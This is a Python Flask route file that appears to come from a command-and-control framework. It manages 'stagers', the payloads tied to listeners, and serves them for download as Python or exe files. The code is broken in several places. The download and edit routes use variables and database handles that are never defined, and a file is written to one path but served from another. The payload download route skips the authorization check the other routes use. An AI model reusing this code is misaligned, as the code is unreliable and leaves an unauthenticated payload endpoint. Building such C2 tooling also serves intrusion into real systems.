from flask import (
    Blueprint,
    send_file,
    render_template,
    jsonify,
    flash,
    redirect,
    session,
    request)
from Utils.web import generate_response
from Utils.ui import log
from Database import db_session, StagerModel
from Web.Endpoints.authorization import authorized, get_current_user
from Creator.stager import get_stager, add_stager
import Creator.options

stagers_bp = Blueprint("stagers", __name__, url_prefix="/stagers")


@stagers_bp.route("/", methods=["GET"])
@authorized
def index():
    return render_template("stagers.html")


@stagers_bp.route("/available", methods=["POST"])
@authorized
def available():
    return jsonify(Creator.options.stagers)


@stagers_bp.route("/add", methods=["POST"])
@authorized
def post_add():
    """Add a stager
    Request Body Example:
    {
        "listener_id": "1",
        "name": "Test Stager1"
    }
    """
    # Get Form Data
    use_json = request.args.get("json", "").lower() == "true"
    name = request.form.get("name")
    listener_id = request.form.get("listener_id", "")
    encoding = request.form.get("encoding", "base64")
    random_size = request.form.get("random_size", False)
    timeout = request.form.get("timeout", 5000)
    stager_format = request.form.get("format", "py")
    delay = request.form.get("delay", 1)

    # Check if Data is Valid
    if not listener_id or not name:
        return generate_response(use_json, "error", "Missing required data.", "stagers", 400)

    if not listener_id.isdigit():
        return generate_response(use_json, "error", "Invalid ID.", "stagers", 400)
    # Create Stager
    try:
        add_stager(
            name,
            listener_id,
            encoding,
            random_size,
            timeout,
            stager_format,

        )
    except Exception as e:
        return generate_response(use_json, "error", str(e), "stagers", 500)
    else:
        log(f"({get_current_user(session['id']).username}) Created Stager {name}", "success")
        return generate_response(use_json, "success", f"Added Stager {name}.", "stagers")


@stagers_bp.route("/remove", methods=["DELETE"])
@authorized
def delete_remove():
    """Remove a stager
    Request Body Example:
    {
        "id": 1,
    }
    """
    # Get Request Data
    use_json = request.args.get("json", "").lower() == "true"
    id = request.form.get("id", "")

    if not id.isdigit():
        return generate_response(use_json, "error", "Invalid ID.", "stagers", 400)
    
    # Check if Stager exists
    stager = db_session.query(StagerModel).filter_by(stager_id=id).first()
    if not stager:
        return generate_response(use_json, "error", "Stager does not exist.", "stagers", 404)

    db_session.delete(stager)
    db_session.commit()
    
    log(f"({get_current_user(session['id']).username}) Deleted Stager with ID {id}", "info")
    return generate_response(use_json, "success", f"Deleted Stager with ID {id}.", "stagers")


@stagers_bp.route("/edit", methods=["PUT"])
@authorized
def put_edit():
    """Edit a stager
    Request Body Example:
    {
        "id": "1",
        "change": "name",
        "value": "Test Stager1"
    }"""

    # Get Request Data
    use_json = request.args.get("json", "").lower() == "true"
    change = request.form.get("change")
    id = request.form.get("id")
    value = request.form.get("value")

    # Check if Data is Valid
    if not change or not value or not id:
        return jsonify({"status": "error", "message": "Missing required data"}), 400 if use_json else abort(400, "Missing required data")
    try:
        id = int(id)
    except ValueError:
        return jsonify({"status": "error", "message": "Invalid ID"}), 400 if use_json else abort(400, "Invalid ID")

    # Check if Stager exists
    curr.execute("SELECT * FROM Stagers WHERE ID = ?", (id,))
    if not curr.fetchone():
        return jsonify({"status": "error", "message": "Stager does not exist"}), 404 if use_json else abort(404, "Stager does not exist")

    log(f"({get_current_user(session['id']).username}) Edited {change} to {value} for Stager with ID {id}", "sucess")
    # Change Stager
    if change == "name":
        curr.execute("UPDATE Stagers SET Name = ? WHERE ID = ?", (value, id))
        conn.commit()
        return jsonify({"status": "success", "message": f"Edited {change} to {value} for Stager with ID {id}"}) if use_json else f"Edited Stager with ID {id}"
    else:
        return jsonify({"status": "error", "message": "Invalid change"}), 400 if use_json else abort(400, "Invalid change")


@stagers_bp.route("/download", methods=["GET"])
def get_download():
    """Download a stager
    \nRequest Args Example:
    \nhttp://localhost:8080/stagers/download?id=1&encoding=base64&random_size=True&timeout=5000&format=py&delay=10&finished=true
    """
    # Get Request Data
    use_json = request.args.get("json", "").lower() == "true"
    id = request.args.get("id")
    finished = True if request.args.get("finished") == "true" else False

    # Check if Data is Valid
    if not id or not encoding or not random_size or not timeout or not format or not delay:
        abort(400, "Missing required data")
    try:
        id = int(id)
    except ValueError:
        return jsonify({"status": "error", "message": "Invalid ID"}), 400 if use_json else abort(400, "Invalid ID")
    try:
        timeout = int(timeout)
    except ValueError:
        return jsonify({"status": "error", "message": "Invalid timeout"}), 400 if use_json else abort(400, "Invalid timeout")
    try:
        delay = int(delay)
    except ValueError:
        return jsonify({"status": "error", "message": "Invalid delay"}), 400 if use_json else abort(400, "Invalid delay")
    # Check if Stager exists
    curr.execute("SELECT * FROM Stagers WHERE ID = ?", (id,))
    if not curr.fetchone():
        return jsonify({"status": "error", "message": "Stager does not exist"}), 400 if use_json else abort(400, "Stager does not exist")

    # Get Stager
    try:
        stager = get_stager(id, encoding, True if random_size.lower(
        ) == "true" else False, timeout, format, delay, finished)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400 if use_json else abort(400, str(e))
    else:
        if format == "py":
            return jsonify({"status": "success", "data": stager}) if use_json else stager
        elif format == "exe":
            with open("stager.exe", "wb") as f:
                f.write(stager)
            return send_file("/tmp/stager.exe", as_attachment=True, download_name=f"stager.exe")


@stagers_bp.route("/list", methods=["GET"])
@authorized
def get_list():
    """Get a list of stagers"""
    curr.execute("SELECT * FROM Stagers")
    stgers = curr.fetchall()
    data = []
    for stger in stgers:
        data.append(
            {"id": stger[0], "name": stger[1], "listener": stger[2]})
    return jsonify(data)
